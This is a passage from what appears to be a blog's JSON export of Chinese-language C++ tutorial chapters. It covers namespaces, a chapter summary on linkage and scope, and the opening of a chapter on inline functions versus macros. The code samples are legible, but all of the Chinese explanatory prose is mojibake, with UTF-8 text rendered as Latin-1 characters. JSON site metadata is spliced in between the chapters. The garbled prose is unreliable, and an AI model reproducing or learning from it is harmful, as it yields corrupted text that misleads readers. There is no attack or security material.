åç§°ç©ºé—´éšç€é¡¹ç›®è¶Šæ¥è¶Šå¤§ï¼Œæˆ–è€…å½“ä½ éœ€è¦ä½¿ç”¨æ¥è‡ªä¸åŒå¼€å‘è€…çš„ä»£ç åº“æ—¶ï¼Œå¯èƒ½ä¼šé‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼šåç§°å†²çªã€‚ä¾‹å¦‚ï¼Œä½ å¯èƒ½å®šä¹‰äº†ä¸€ä¸ªåä¸º List çš„ç±»ï¼Œè€Œå¦ä¸€ä¸ªåº“ä¹Ÿå®šä¹‰äº†ä¸€ä¸ªåŒåçš„ List ç±»ã€‚å½“ä½ åœ¨åŒä¸€ä¸ªç¨‹åºä¸­ä½¿ç”¨è¿™ä¸¤ä¸ªç±»æ—¶ï¼Œç¼–è¯‘å™¨å°±æ— æ³•åŒºåˆ†ä½ æŒ‡çš„æ˜¯å“ªä¸ª Listã€‚ ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒC++å¼•å…¥äº†åç§°ç©ºé—´ (Namespace) çš„æ¦‚å¿µã€‚åç§°ç©ºé—´æä¾›äº†ä¸€ç§å°†å…¨å±€ä½œç”¨åŸŸåˆ’åˆ†ä¸ºä¸åŒé€»è¾‘éƒ¨åˆ†çš„æ–¹æ³•ï¼Œæ¯ä¸ªéƒ¨åˆ†åŒ…å«ä¸€ç»„ç›¸å…³çš„åç§°ï¼ˆå¦‚å˜é‡ã€å‡½æ•°ã€ç±»ç­‰ï¼‰ã€‚ 9.3.1 ä¼ ç»Ÿçš„C++åç§°ç©ºé—´åœ¨åç§°ç©ºé—´ç‰¹æ€§è¢«å¼•å…¥ä¹‹å‰ï¼ŒC++åªæœ‰ä¸€ä¸ª**å…¨å±€åç§°ç©ºé—´ (Global Namespace)**ã€‚æ‰€æœ‰åœ¨ä»»ä½•å‡½æ•°ã€ç±»æˆ–ç»“æ„å¤–éƒ¨å£°æ˜çš„åç§°éƒ½å±äºå…¨å±€åç§°ç©ºé—´ã€‚å¤§å‹é¡¹ç›®ä¸­ï¼Œè¿™å¾ˆå®¹æ˜“å¯¼è‡´åç§°å†²çªï¼Œç‰¹åˆ«æ˜¯å½“åŒ…å«å¤šä¸ªç¬¬ä¸‰æ–¹åº“æ—¶ã€‚ å¼€å‘è€…æœ‰æ—¶ä¼šä½¿ç”¨ä¸€äº›çº¦å®šæ¥æ¨¡æ‹Ÿåç§°ç©ºé—´ï¼Œä¾‹å¦‚ç»™æ‰€æœ‰ç›¸å…³çš„åç§°æ·»åŠ ç‰¹å®šçš„å‰ç¼€ï¼ˆå¦‚ mylib_Listï¼‰ï¼Œä½†è¿™å¹¶ä¸æ˜¯ä¸€ä¸ªå®Œç¾çš„è§£å†³æ–¹æ¡ˆã€‚ 9.3.2 æ–°çš„åç§°ç©ºé—´ç‰¹æ€§C++æ ‡å‡†å¼•å…¥äº† namespace å…³é”®å­—æ¥æ˜¾å¼åœ°åˆ›å»ºå…·åçš„åç§°ç©ºé—´ã€‚ å®šä¹‰åç§°ç©ºé—´: 12345678910namespace mycode &#123; // åœ¨è¿™é‡Œå£°æ˜å’Œå®šä¹‰å˜é‡ã€å‡½æ•°ã€ç±»ç­‰ int value = 10; void printValue() &#123; std::cout &lt;&lt; &quot;Value: &quot; &lt;&lt; value &lt;&lt; std::endl; &#125; class MyClass &#123; // ... &#125;;&#125; // namespace mycode è®¿é—®åç§°ç©ºé—´æˆå‘˜: æœ‰ä¸‰ç§ä¸»è¦æ–¹æ³•å¯ä»¥è®¿é—®åç§°ç©ºé—´ä¸­çš„æˆå‘˜ï¼š ä½œç”¨åŸŸè§£æè¿ç®—ç¬¦ :: (Scope Resolution Operator): ä½¿ç”¨åç§°ç©ºé—´åç§°å’Œ :: æ¥é™å®šæˆå‘˜åã€‚è¿™æ˜¯æœ€å®‰å…¨çš„æ–¹å¼ï¼Œå› ä¸ºå®ƒæ˜ç¡®æŒ‡å‡ºäº†ä½¿ç”¨çš„æ˜¯å“ªä¸ªåç§°ç©ºé—´çš„æˆå‘˜ã€‚ 12345678910#include &lt;iostream&gt;namespace mycode &#123; int value = 10;&#125;int main() &#123; std::cout &lt;&lt; mycode::value &lt;&lt; std::endl; // è¾“å‡º 10 return 0;&#125; using å£°æ˜ (Using Declaration): ä½¿ç‰¹å®šçš„åç§°ç©ºé—´æˆå‘˜å¯ç”¨ï¼Œå°±åƒå®ƒæ˜¯åœ¨å½“å‰ä½œç”¨åŸŸå£°æ˜çš„ä¸€æ ·ã€‚ 123456789101112131415#include &lt;iostream&gt;namespace mycode &#123; int value = 10; double score = 9.5;&#125;int main() &#123; using mycode::value; // åªè®© value å¯ç”¨ std::cout &lt;&lt; value &lt;&lt; std::endl; // è¾“å‡º 10 (ç›´æ¥è®¿é—®) // std::cout &lt;&lt; score &lt;&lt; std::endl; // é”™è¯¯ï¼score æœªå£°æ˜ std::cout &lt;&lt; mycode::score &lt;&lt; std::endl; // éœ€è¦é™å®šç¬¦ return 0;&#125; using æŒ‡ä»¤ (Using Directive): ä½¿æ•´ä¸ªåç§°ç©ºé—´çš„æ‰€æœ‰æˆå‘˜éƒ½å¯ç”¨ã€‚è¿™æ¯”è¾ƒæ–¹ä¾¿ï¼Œä½†ä¹Ÿå¯èƒ½é‡æ–°å¼•å…¥åç§°å†²çªçš„é—®é¢˜ï¼Œåº”è°¨æ…ä½¿ç”¨ï¼Œå°¤å…¶æ˜¯åœ¨å¤´æ–‡ä»¶ä¸­ã€‚ 123456789101112131415#include &lt;iostream&gt;namespace mycode &#123; int value = 10; double score = 9.5;&#125;// ä½¿ç”¨ using æŒ‡ä»¤ä½¿ mycode çš„æ‰€æœ‰æˆå‘˜å¯ç”¨using namespace mycode;int main() &#123; std::cout &lt;&lt; value &lt;&lt; std::endl; // è¾“å‡º 10 (ç›´æ¥è®¿é—®) std::cout &lt;&lt; score &lt;&lt; std::endl; // è¾“å‡º 9.5 (ç›´æ¥è®¿é—®) return 0;&#125; std åç§°ç©ºé—´: C++æ ‡å‡†åº“çš„æ‰€æœ‰ç»„ä»¶ï¼ˆå¦‚ cout, cin, string, vector ç­‰ï¼‰éƒ½è¢«å®šä¹‰åœ¨ std åç§°ç©ºé—´ä¸­ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬é€šå¸¸éœ€è¦å†™ std::cout æˆ–è€…åœ¨æ–‡ä»¶å¼€å¤´ä½¿ç”¨ using namespace std; æˆ– using std::cout;ã€‚ æœªå‘½åçš„åç§°ç©ºé—´ (Unnamed Namespaces): ä½ ä¹Ÿå¯ä»¥åˆ›å»ºæœªå‘½åçš„åç§°ç©ºé—´ã€‚è¿™ç±»ä¼¼äºä½¿ç”¨ static å…³é”®å­—å£°æ˜å…·æœ‰å†…éƒ¨é“¾æ¥æ€§çš„å…¨å±€å˜é‡æˆ–å‡½æ•°ã€‚æœªå‘½ååç§°ç©ºé—´ä¸­çš„æˆå‘˜åªèƒ½åœ¨å½“å‰æ–‡ä»¶å†…è®¿é—®ã€‚ 1234567891011namespace &#123; // è¿™äº›æˆå‘˜åªåœ¨å½“å‰æ–‡ä»¶å¯è§ int internal_count = 0; void increment() &#123; internal_count++; &#125;&#125;// åœ¨åŒä¸€æ–‡ä»¶ä¸­å¯ä»¥è®¿é—®// increment();// std::cout &lt;&lt; internal_count &lt;&lt; std::endl; 9.3.3 åç§°ç©ºé—´ç¤ºä¾‹ä¸‹é¢æ˜¯ä¸€ä¸ªæ›´å®Œæ•´çš„ç¤ºä¾‹ï¼Œå±•ç¤ºäº†å¦‚ä½•å®šä¹‰å’Œä½¿ç”¨å¤šä¸ªåç§°ç©ºé—´ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;iostream&gt;#include &lt;string&gt; // std å‘½åç©ºé—´ä¸­çš„ string ç±»// ç¬¬ä¸€ä¸ªåç§°ç©ºé—´namespace first_space &#123; void display() &#123; std::cout &lt;&lt; &quot;Inside first_space&quot; &lt;&lt; std::endl; &#125; int count = 1;&#125;// ç¬¬äºŒä¸ªåç§°ç©ºé—´namespace second_space &#123; void display() &#123; std::cout &lt;&lt; &quot;Inside second_space&quot; &lt;&lt; std::endl; &#125; int count = 2;&#125;int main() &#123; // ä½¿ç”¨ä½œç”¨åŸŸè§£æè¿ç®—ç¬¦ first_space::display(); // è¾“å‡º: Inside first_space second_space::display(); // è¾“å‡º: Inside second_space std::cout &lt;&lt; &quot;first_space::count = &quot; &lt;&lt; first_space::count &lt;&lt; std::endl; // è¾“å‡º: 1 std::cout &lt;&lt; &quot;second_space::count = &quot; &lt;&lt; second_space::count &lt;&lt; std::endl; // è¾“å‡º: 2 // ä½¿ç”¨ using å£°æ˜ &#123; // åˆ›å»ºä¸€ä¸ªæ–°çš„ä½œç”¨åŸŸ using first_space::display; display(); // è°ƒç”¨ first_space::display() &#125; // ä½¿ç”¨ using æŒ‡ä»¤ (é€šå¸¸å»ºè®®åœ¨å‡½æ•°å†…éƒ¨æˆ–ç‰¹å®šä½œç”¨åŸŸå†…ä½¿ç”¨) &#123; // åˆ›å»ºä¸€ä¸ªæ–°çš„ä½œç”¨åŸŸ using namespace second_space; display(); // è°ƒç”¨ second_space::display() std::cout &lt;&lt; &quot;count from second_space = &quot; &lt;&lt; count &lt;&lt; std::endl; // è®¿é—® second_space::count &#125; // std å‘½åç©ºé—´çš„ä½¿ç”¨ std::string message = &quot;Hello from std namespace!&quot;; std::cout &lt;&lt; message &lt;&lt; std::endl; return 0;&#125; 9.3.4 åç§°ç©ºé—´åŠå…¶å‰é€”åç§°ç©ºé—´æ˜¯ç°ä»£C++ç¼–ç¨‹ä¸å¯æˆ–ç¼ºçš„ä¸€éƒ¨åˆ†ã€‚å®ƒä»¬æ˜¯ç»„ç»‡ä»£ç ã€é¿å…åç§°å†²çªä»¥åŠç®¡ç†å¤§å‹é¡¹ç›®å¤æ‚æ€§çš„å…³é”®å·¥å…·ã€‚ åº“å¼€å‘: å‡ ä¹æ‰€æœ‰çš„ç°ä»£C++åº“éƒ½å°†å…¶ç»„ä»¶æ”¾åœ¨ä¸€ä¸ªæˆ–å¤šä¸ªåç§°ç©ºé—´ä¸­ï¼Œä»¥é˜²æ­¢ä¸ä½¿ç”¨è¯¥åº“çš„ä»£ç æˆ–å…¶ä»–åº“å‘ç”Ÿå†²çªã€‚std æ˜¯æœ€å…¸å‹çš„ä¾‹å­ã€‚ é¡¹ç›®ç»„ç»‡: åœ¨å¤§å‹é¡¹ç›®ä¸­ï¼Œå¼€å‘è€…ç»å¸¸ä½¿ç”¨åç§°ç©ºé—´æ¥åˆ’åˆ†ä»£ç çš„ä¸åŒæ¨¡å—æˆ–åŠŸèƒ½åŒºåŸŸã€‚ é¿å…å…¨å±€æ±¡æŸ“: ä½¿ç”¨åç§°ç©ºé—´å¯ä»¥å‡å°‘å…¨å±€ä½œç”¨åŸŸä¸­çš„åç§°æ•°é‡ï¼Œä½¿ä»£ç æ›´æ¸…æ™°ã€æ›´æ˜“äºç»´æŠ¤ã€‚ æœ€ä½³å®è·µ: **ä¼˜å…ˆä½¿ç”¨ä½œç”¨åŸŸè§£æè¿ç®—ç¬¦ (::)**ï¼šè¿™æ˜¯æœ€æ˜ç¡®ã€æœ€ä¸æ˜“å‡ºé”™çš„æ–¹å¼ã€‚ åœ¨ .cpp æ–‡ä»¶æˆ–å‡½æ•°å†…éƒ¨ä½¿ç”¨ using å£°æ˜æˆ–æŒ‡ä»¤ï¼šé¿å…åœ¨å¤´æ–‡ä»¶ï¼ˆ.h æˆ– .hppï¼‰çš„é¡¶å±‚ä½¿ç”¨ using æŒ‡ä»¤ï¼Œå› ä¸ºå®ƒä¼šå½±å“æ‰€æœ‰åŒ…å«è¯¥å¤´æ–‡ä»¶çš„æ–‡ä»¶ï¼Œå¯èƒ½å¯¼è‡´æ„æƒ³ä¸åˆ°çš„åç§°å†²çªã€‚ å°†è‡ªå·±çš„ä»£ç æ”¾å…¥åç§°ç©ºé—´ï¼šè¿™æ˜¯ä¸€ä¸ªè‰¯å¥½çš„ç¼–ç¨‹ä¹ æƒ¯ï¼Œç‰¹åˆ«æ˜¯å½“ä½ ç¼–å†™å¯èƒ½è¢«ä»–äººé‡ç”¨çš„ä»£ç æ—¶ã€‚ ç†è§£å’Œæ­£ç¡®ä½¿ç”¨åç§°ç©ºé—´å¯¹äºç¼–å†™å¥å£®ã€å¯ç»´æŠ¤çš„C++ä»£ç è‡³å…³é‡è¦ã€‚ 9.4 æ€»ç»“æœ¬ç« æ¢è®¨äº†C++å¦‚ä½•ç®¡ç†ç¨‹åºä¸­çš„å†…å­˜å’Œåç§°ï¼Œç‰¹åˆ«æ˜¯åœ¨æ¶‰åŠå¤šä¸ªæ–‡ä»¶çš„å¤§å‹é¡¹ç›®ä¸­ã€‚è¿™äº›æœºåˆ¶å¯¹äºç¼–å†™ç»“æ„æ¸…æ™°ã€å¯ç»´æŠ¤ä¸”å¯æ‰©å±•çš„C++ä»£ç è‡³å…³é‡è¦ã€‚ ä¸»è¦å†…å®¹å›é¡¾ï¼š å•ç‹¬ç¼–è¯‘ (Separate Compilation): C++å…è®¸å°†ç¨‹åºåˆ†è§£ä¸ºå¤šä¸ªæºæ–‡ä»¶ï¼ˆ.cppï¼‰å’Œå¤´æ–‡ä»¶ï¼ˆ.h æˆ– .hppï¼‰ã€‚æºæ–‡ä»¶åŒ…å«å‡½æ•°çš„å…·ä½“å®ç°æˆ–å˜é‡çš„å®šä¹‰ï¼Œè€Œå¤´æ–‡ä»¶é€šå¸¸åŒ…å«å£°æ˜ï¼ˆå¦‚å‡½æ•°åŸå‹ã€ç±»å®šä¹‰ã€å¸¸é‡å£°æ˜ã€æ¨¡æ¿ç­‰ï¼‰ã€‚æ¯ä¸ªæºæ–‡ä»¶å¯ä»¥è¢«ç‹¬ç«‹ç¼–è¯‘æˆç›®æ ‡æ–‡ä»¶ï¼ˆ.obj æˆ– .oï¼‰ï¼Œæœ€åç”±é“¾æ¥å™¨å°†è¿™äº›ç›®æ ‡æ–‡ä»¶ä»¥åŠæ‰€éœ€çš„åº“æ–‡ä»¶ç»„åˆæˆæœ€ç»ˆçš„å¯æ‰§è¡Œç¨‹åºã€‚è¿™ç§æ–¹å¼æé«˜äº†ç¼–è¯‘æ•ˆç‡ï¼Œå¹¶ä½¿å¾—ä»£ç æ¨¡å—åŒ–å’Œé‡ç”¨æ›´åŠ æ–¹ä¾¿ã€‚ å­˜å‚¨æŒç»­æ€§ã€ä½œç”¨åŸŸå’Œé“¾æ¥æ€§ (Storage Duration, Scope, and Linkage): å­˜å‚¨æŒç»­æ€§å†³å®šäº†å˜é‡æˆ–å¯¹è±¡åœ¨å†…å­˜ä¸­å­˜åœ¨çš„æ—¶é—´ã€‚ä¸»è¦æœ‰ï¼šè‡ªåŠ¨å­˜å‚¨ï¼ˆå‡½æ•°å†…å®šä¹‰çš„å±€éƒ¨å˜é‡ï¼Œéšå‡½æ•°è°ƒç”¨åˆ›å»ºå’Œé”€æ¯ï¼‰ã€é™æ€å­˜å‚¨ï¼ˆç¨‹åºè¿è¡ŒæœŸé—´ä¸€ç›´å­˜åœ¨ï¼Œå¦‚å…¨å±€å˜é‡æˆ–ç”¨ static ä¿®é¥°çš„å˜é‡ï¼‰ã€çº¿ç¨‹å­˜å‚¨ï¼ˆC++11å¼•å…¥ï¼Œä¸ç‰¹å®šçº¿ç¨‹ç”Ÿå‘½å‘¨æœŸç›¸å…³ï¼‰å’ŒåŠ¨æ€å­˜å‚¨ï¼ˆä½¿ç”¨ new åˆ†é…ï¼Œdelete é‡Šæ”¾ï¼‰ã€‚ ä½œç”¨åŸŸå®šä¹‰äº†ç¨‹åºä¸­å¯ä»¥è®¿é—®ä¸€ä¸ªåç§°ï¼ˆå˜é‡ã€å‡½æ•°ç­‰ï¼‰çš„åŒºåŸŸã€‚ä¸»è¦æœ‰ï¼šå—ä½œç”¨åŸŸï¼ˆ&#123;&#125;å†…éƒ¨ï¼‰ã€å‡½æ•°ä½œç”¨åŸŸï¼ˆä»…ç”¨äº goto æ ‡ç­¾ï¼‰ã€å‡½æ•°åŸå‹ä½œç”¨åŸŸï¼ˆä»…ç”¨äºå‚æ•°åï¼‰ã€æ–‡ä»¶ä½œç”¨åŸŸï¼ˆå…¨å±€ä½œç”¨åŸŸï¼‰å’Œç±»ä½œç”¨åŸŸã€‚ é“¾æ¥æ€§å†³å®šäº†åœ¨ä¸åŒæ–‡ä»¶æˆ–ç¼–è¯‘å•å…ƒä¸­å£°æ˜çš„åŒåæ ‡è¯†ç¬¦æ˜¯å¦æŒ‡å‘åŒä¸€ä¸ªå®ä½“ã€‚ä¸»è¦æœ‰ï¼šå¤–éƒ¨é“¾æ¥ï¼ˆå¯åœ¨å¤šä¸ªæ–‡ä»¶ä¸­å…±äº«ï¼Œå¦‚æ™®é€šå…¨å±€å˜é‡å’Œå‡½æ•°ï¼‰ã€å†…éƒ¨é“¾æ¥ï¼ˆä»…åœ¨å½“å‰æ–‡ä»¶å†…å¯è§ï¼Œå¦‚ç”¨ static ä¿®é¥°çš„å…¨å±€å˜é‡/å‡½æ•°æˆ–æœªå‘½åç©ºé—´ä¸­çš„æˆå‘˜ï¼‰å’Œæ— é“¾æ¥ï¼ˆå¦‚å±€éƒ¨å˜é‡ï¼‰ã€‚extern å…³é”®å­—å¯ç”¨äºå¼•ç”¨å…¶ä»–æ–‡ä»¶ä¸­å…·æœ‰å¤–éƒ¨é“¾æ¥çš„å˜é‡ã€‚ åç§°ç©ºé—´ (Namespaces): ä¸ºäº†è§£å†³å¤§å‹é¡¹ç›®ä¸­å¯èƒ½å‡ºç°çš„åç§°å†²çªé—®é¢˜ï¼ˆä¾‹å¦‚ï¼Œä¸åŒåº“å®šä¹‰äº†åŒåçš„å‡½æ•°æˆ–ç±»ï¼‰ï¼ŒC++å¼•å…¥äº†åç§°ç©ºé—´ã€‚ ä½¿ç”¨ namespace å…³é”®å­—å¯ä»¥åˆ›å»ºå…·åçš„ä»£ç åŒºåŸŸã€‚ è®¿é—®åç§°ç©ºé—´æˆå‘˜å¯ä»¥é€šè¿‡ä½œç”¨åŸŸè§£æè¿ç®—ç¬¦ ::ï¼ˆå¦‚ std::coutï¼‰ã€using å£°æ˜ï¼ˆå¦‚ using std::cout;ï¼‰æˆ– using æŒ‡ä»¤ï¼ˆå¦‚ using namespace std;ï¼‰ã€‚ C++æ ‡å‡†åº“çš„æ‰€æœ‰åŠŸèƒ½éƒ½ä½äº std åç§°ç©ºé—´ä¸­ã€‚ æœªå‘½åçš„åç§°ç©ºé—´æä¾›äº†ä¸€ç§åˆ›å»ºå…·æœ‰å†…éƒ¨é“¾æ¥æ€§çš„å®ä½“çš„æ–¹æ³•ï¼Œæ˜¯æ›¿ä»£æ–‡ä»¶ä½œç”¨åŸŸ static çš„ç°ä»£æ–¹å¼ã€‚ æŒæ¡è¿™äº›æ¦‚å¿µæœ‰åŠ©äºæ›´å¥½åœ°ç»„ç»‡ä»£ç ï¼Œç†è§£å˜é‡å’Œå‡½æ•°çš„ç”Ÿå‘½å‘¨æœŸä¸å¯è§æ€§ï¼Œå¹¶æœ‰æ•ˆé¿å…åç§°å†²çªï¼Œä»è€Œæ„å»ºæ›´å¥å£®ã€æ›´æ¨¡å—åŒ–çš„C++åº”ç”¨ç¨‹åºã€‚","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"C++","slug":"C","permalink":"http://uniqueland.top/tags/C/"}]},{"title":"Chapter 8 å‡½æ•°è¿›é˜¶","slug":"Cpp_tutorial_Chapter_8","date":"2025-04-26T12:03:35.389Z","updated":"2025-04-26T12:02:12.619Z","comments":true,"path":"2025/04/26/Cpp_tutorial_Chapter_8/","link":"","permalink":"http://uniqueland.top/2025/04/26/Cpp_tutorial_Chapter_8/","excerpt":"","text":"8.1 C++ å†…è”å‡½æ•°å¸¸è§„çš„å‡½æ•°è°ƒç”¨è¿‡ç¨‹æ¶‰åŠä¸€äº›å¼€é”€ï¼šç¨‹åºéœ€è¦è·³è½¬åˆ°å‡½æ•°çš„å†…å­˜åœ°å€ï¼Œä¿å­˜å½“å‰æ‰§è¡ŒçŠ¶æ€ï¼ˆå¦‚å¯„å­˜å™¨å€¼ï¼‰ï¼Œå°†å‚æ•°å¤åˆ¶åˆ°æ ˆä¸Šï¼Œæ‰§è¡Œå‡½æ•°ä»£ç ï¼Œå­˜å‚¨è¿”å›å€¼ï¼Œæ¢å¤æ‰§è¡ŒçŠ¶æ€ï¼Œç„¶åè·³è½¬å›è°ƒç”¨ç‚¹ã€‚å¯¹äºéå¸¸çŸ­å°ä¸”é¢‘ç¹è°ƒç”¨çš„å‡½æ•°ï¼Œè¿™äº›å¼€é”€å¯èƒ½ä¼šå˜å¾—æ˜¾è‘—ï¼Œå½±å“ç¨‹åºæ€§èƒ½ã€‚ å†…è”å‡½æ•° (Inline Function) æ˜¯ C++ æä¾›çš„ä¸€ç§ä¼˜åŒ–æœºåˆ¶ï¼Œæ—¨åœ¨å‡å°‘è¿™ç§å‡½æ•°è°ƒç”¨å¼€é”€ã€‚å…¶åŸºæœ¬æ€æƒ³æ˜¯ï¼šå»ºè®®ç¼–è¯‘å™¨åœ¨ç¼–è¯‘æ—¶å°†å‡½æ•°çš„å®é™…ä»£ç ç›´æ¥æ›¿æ¢åˆ°æ¯ä¸ªè°ƒç”¨è¯¥å‡½æ•°çš„åœ°æ–¹ï¼Œè€Œä¸æ˜¯æ‰§è¡Œå¸¸è§„çš„å‡½æ•°è°ƒç”¨è·³è½¬ã€‚ ç”¨æ³•è¦å»ºè®®ç¼–è¯‘å™¨å°†ä¸€ä¸ªå‡½æ•°è§†ä¸ºå†…è”å‡½æ•°ï¼Œå¯ä»¥åœ¨å‡½æ•°å®šä¹‰å‰åŠ ä¸Š inline å…³é”®å­—ã€‚ è¯­æ³•: 123inline return_type function_name(parameter_list) &#123; // å‡½æ•°ä½“&#125; ç¤ºä¾‹: 123456789101112131415161718192021#include &lt;iostream&gt;// å®šä¹‰ä¸€ä¸ªç®€å•çš„å†…è”å‡½æ•°inline double square(double x) &#123; return x * x;&#125;int main() &#123; double a = 5.0; double b; // è°ƒç”¨å†…è”å‡½æ•° b = square(a); // ç¼–è¯‘å™¨å¯èƒ½ä¼šå°†è¿™é‡Œæ›¿æ¢ä¸º: b = a * a; std::cout &lt;&lt; &quot;a = &quot; &lt;&lt; a &lt;&lt; &quot;, a squared = &quot; &lt;&lt; b &lt;&lt; std::endl; double c = square(1.5 + 2.5); // ç¼–è¯‘å™¨å¯èƒ½ä¼šæ›¿æ¢ä¸º: double c = (1.5 + 2.5) * (1.5 + 2.5); std::cout &lt;&lt; &quot;(1.5 + 2.5) squared = &quot; &lt;&lt; c &lt;&lt; std::endl; return 0;&#125; ä»£ç è§£é‡Š: square å‡½æ•°è¢«å£°æ˜ä¸º inlineã€‚ åœ¨ main å‡½æ•°ä¸­è°ƒç”¨ square(a) æ—¶ï¼Œç¼–è¯‘å™¨å¯èƒ½ä¼šç›´æ¥ç”¨ a * a çš„ä»£ç æ›¿æ¢è¿™æ¬¡è°ƒç”¨ï¼Œé¿å…äº†å‡½æ•°è°ƒç”¨çš„å¼€é”€ã€‚ åŒæ ·ï¼Œsquare(1.5 + 2.5) å¯èƒ½è¢«æ›¿æ¢ä¸º (1.5 + 2.5) * (1.5 + 2.5)ã€‚ inline çš„ç‰¹æ€§å’Œæ³¨æ„äº‹é¡¹ å»ºè®®è€Œéå‘½ä»¤: inline å…³é”®å­—åªæ˜¯å‘ç¼–è¯‘å™¨æå‡ºçš„ä¸€ä¸ªå»ºè®®ã€‚ç¼–è¯‘å™¨ä¼šæ ¹æ®è‡ªå·±çš„ä¼˜åŒ–ç­–ç•¥æ¥å†³å®šæ˜¯å¦çœŸçš„è¿›è¡Œå†…è”ã€‚å¦‚æœå‡½æ•°ä½“è¿‡äºå¤æ‚ï¼ˆä¾‹å¦‚åŒ…å«å¾ªç¯ã€é€’å½’ã€å¤§é‡ä»£ç ï¼‰ï¼Œæˆ–è€…ç¼–è¯‘å™¨è®¤ä¸ºå†…è”ä¸ä¼šå¸¦æ¥å¥½å¤„ï¼ˆç”šè‡³å¯èƒ½æœ‰å®³ï¼‰ï¼Œå®ƒå¯èƒ½ä¼šå¿½ç•¥ inline å»ºè®®ï¼Œä»ç„¶æ‰§è¡Œå¸¸è§„çš„å‡½æ•°è°ƒç”¨ã€‚ é€‚ç”¨äºå°å‹å‡½æ•°: å†…è”æœ€é€‚åˆé‚£äº›ä»£ç é‡å°ã€æ‰§è¡Œé€Ÿåº¦å¿«ä¸”è¢«é¢‘ç¹è°ƒç”¨çš„å‡½æ•°ã€‚å¦‚æœå†…è”ä¸€ä¸ªå¤§å‡½æ•°ï¼Œå¯èƒ½ä¼šå¯¼è‡´æœ€ç»ˆç”Ÿæˆçš„å¯æ‰§è¡Œä»£ç ä½“ç§¯æ˜¾è‘—å¢å¤§ï¼ˆä»£ç è†¨èƒ€ï¼‰ï¼Œåè€Œé™ä½æ€§èƒ½ï¼ˆå› ä¸ºæ›´å¤§çš„ä»£ç å¯èƒ½å¯¼è‡´æ›´å¤šçš„ç¼“å­˜æœªå‘½ä¸­ï¼‰ã€‚ å®šä¹‰ä½ç½®: ä¸ºäº†è®©ç¼–è¯‘å™¨èƒ½å¤Ÿåœ¨è°ƒç”¨ç‚¹å±•å¼€å‡½æ•°ä»£ç ï¼Œå†…è”å‡½æ•°çš„å®šä¹‰ï¼ˆè€Œä¸ä»…ä»…æ˜¯åŸå‹ï¼‰é€šå¸¸éœ€è¦æ”¾åœ¨è°ƒç”¨è¯¥å‡½æ•°çš„æ¯ä¸ªæºæ–‡ä»¶ä¸­ã€‚æœ€å¸¸è§çš„åšæ³•æ˜¯å°†å†…è”å‡½æ•°çš„å®šä¹‰ç›´æ¥æ”¾åœ¨å¤´æ–‡ä»¶ä¸­ã€‚è¿™æ ·ï¼ŒåŒ…å«è¯¥å¤´æ–‡ä»¶çš„æ‰€æœ‰æºæ–‡ä»¶éƒ½èƒ½çœ‹åˆ°å®Œæ•´çš„å‡½æ•°å®šä¹‰ï¼Œç¼–è¯‘å™¨å°±æœ‰æœºä¼šè¿›è¡Œå†…è”ã€‚ æ³¨æ„ï¼šå°†å‡½æ•°å®šä¹‰æ”¾åœ¨å¤´æ–‡ä»¶ä¸­å¯¹äºéå†…è”å‡½æ•°é€šå¸¸æ˜¯é”™è¯¯çš„ï¼ˆä¼šå¯¼è‡´é“¾æ¥é”™è¯¯ï¼Œå› ä¸ºåŒä¸€ä¸ªå‡½æ•°ä¼šåœ¨å¤šä¸ªç¼–è¯‘å•å…ƒä¸­å®šä¹‰ï¼‰ï¼Œä½†å¯¹äºå†…è”å‡½æ•°æ˜¯å…è®¸ä¸”å¿…è¦çš„ã€‚ ç±»å®šä¹‰ä¸­çš„å‡½æ•°: åœ¨ç±»ï¼ˆclass æˆ– structï¼‰å®šä¹‰å†…éƒ¨å®ç°çš„æˆå‘˜å‡½æ•°é»˜è®¤å°±æ˜¯å†…è”çš„ï¼Œä¸éœ€è¦æ˜¾å¼æ·»åŠ  inline å…³é”®å­—ã€‚ 123456class MyClass &#123;public: int getValue() const &#123; return value; &#125; // é»˜è®¤æ˜¯å†…è”çš„private: int value;&#125;; å†…è”å‡½æ•° vs. å® (#define)åœ¨ C è¯­è¨€ä¸­ï¼Œæœ‰æ—¶ä¼šä½¿ç”¨å¸¦å‚æ•°çš„å®ï¼ˆ#defineï¼‰æ¥æ¨¡æ‹Ÿç±»ä¼¼å†…è”å‡½æ•°çš„æ•ˆæœï¼Œä»¥é¿å…å‡½æ•°è°ƒç”¨å¼€é”€ã€‚ä¾‹å¦‚ï¼š 1#define SQUARE(X) ((X)*(X)) // C é£æ ¼å® ç„¶è€Œï¼Œå®å­˜åœ¨ä¸€äº›ç¼ºç‚¹ï¼š ç±»å‹ä¸å®‰å…¨: å®åªæ˜¯ç®€å•çš„æ–‡æœ¬æ›¿æ¢ï¼Œä¸è¿›è¡Œç±»å‹æ£€æŸ¥ã€‚ æ„å¤–çš„å‰¯ä½œç”¨: å¦‚æœå‚æ•°å¸¦æœ‰å‰¯ä½œç”¨ï¼ˆå¦‚ SQUARE(i++)ï¼‰ï¼Œå¯èƒ½ä¼šå¯¼è‡´æ„æƒ³ä¸åˆ°çš„ç»“æœï¼Œå› ä¸ºå‚æ•°ä¼šè¢«å¤šæ¬¡æ±‚å€¼ (((i++)*(i++))ï¼‰ã€‚ è°ƒè¯•å›°éš¾: å®åœ¨é¢„å¤„ç†é˜¶æ®µå°±è¢«æ›¿æ¢æ‰äº†ï¼Œè°ƒè¯•å™¨é€šå¸¸çœ‹ä¸åˆ°å®çš„åŸå§‹å½¢å¼ã€‚ ä½œç”¨åŸŸé—®é¢˜: å®ä¸å— C++ çš„ä½œç”¨åŸŸè§„åˆ™çº¦æŸã€‚ å†…è”å‡½æ•°å…‹æœäº†è¿™äº›ç¼ºç‚¹ï¼š ç±»å‹å®‰å…¨: å†…è”å‡½æ•°éµå¾ªæ­£å¸¸çš„å‡½æ•°ç±»å‹æ£€æŸ¥è§„åˆ™ã€‚ å‚æ•°æ±‚å€¼: å‚æ•°åªä¼šè¢«æ±‚å€¼ä¸€æ¬¡ã€‚ å¯è°ƒè¯•: å†…è”å‡½æ•°ä»ç„¶æ˜¯çœŸæ­£çš„å‡½æ•°ï¼Œå¯ä»¥ç”¨è°ƒè¯•å™¨è¿›è¡Œè°ƒè¯•ï¼ˆå°½ç®¡å†…è”åçš„ä»£ç å¯èƒ½çœ‹èµ·æ¥ä¸åŒï¼‰ã€‚ 